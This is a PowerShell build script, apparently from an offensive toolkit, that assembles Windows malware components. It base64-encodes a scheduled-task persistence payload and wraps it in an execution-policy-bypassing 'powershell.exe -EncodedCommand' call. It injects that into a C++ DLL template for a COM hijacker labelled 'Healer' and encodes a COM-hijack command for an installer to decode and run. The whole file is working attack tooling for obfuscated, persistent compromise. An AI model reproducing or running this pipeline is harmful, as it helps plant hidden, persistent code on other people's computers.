##### Persistence (Scheduled Task) #####
$ScheduledTaskTemplatePath = ".\scheduled_task_template.ps1"
$ScheduledTaskPayloadPath = ".\scheduled_task_payload.ps1"

# Convert the scheduled task payload to base64.
$scheduled_task_payload = Get-Content -Path $ScheduledTaskPayloadPath -Raw
$b64_scheduled_task_payload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scheduled_task_payload))

# Replace the placeholder in the scheduled task template with the base64 encoded payload.
$scheduled_task_template = Get-Content -Path $ScheduledTaskTemplatePath -Raw
$scheduled_task_cmd = $scheduled_task_template -replace "{{PAYLOAD}}", $b64_scheduled_task_payload

# Convert the scheduled task command to base64.
$b64_scheduled_task_cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scheduled_task_cmd))

# As the COM DLL does not decode64 you need to wrap the base64-encoded scheduled task command.
$dll_payload = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ' + $b64_scheduled_task_cmd

##### Healer (COM Hijacker) - Part 1 (DLL) #####
$DLLTemplatePath = ".\dll_template.cpp"
$DLLOutputPath = ".\dll.cpp"

# Complete the DLL template by replacing the placeholder with the payload above.
$dll_template = Get-Content -Path $DLLTemplatePath -Raw
$dll = $dll_template -replace "{{PAYLOAD}}", $dll_payload
Set-Content -Path $DLLOutputPath -Value $dll

# Build the DLL.
# TODO: cl.exe

##### Healer (COM Hijacker) - Part 2 (Powershell command) #####
$COMHijackPath = ".\com_hijack.ps1"
$B64COMHijackOutputPath = ".\com_hijack.b64"

# Load the PowerShell command for creating the COM hijack.
$com_hijack_cmd = Get-Content -Path $COMHijackPath -Raw

# Convert the command to base64. The installer will decode it and execute it.
$b64_com_hijack_cmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($com_hijack_cmd))
Set-Content -Path $B64COMHijackOutputPath -Value $b64_com_hijack_cmd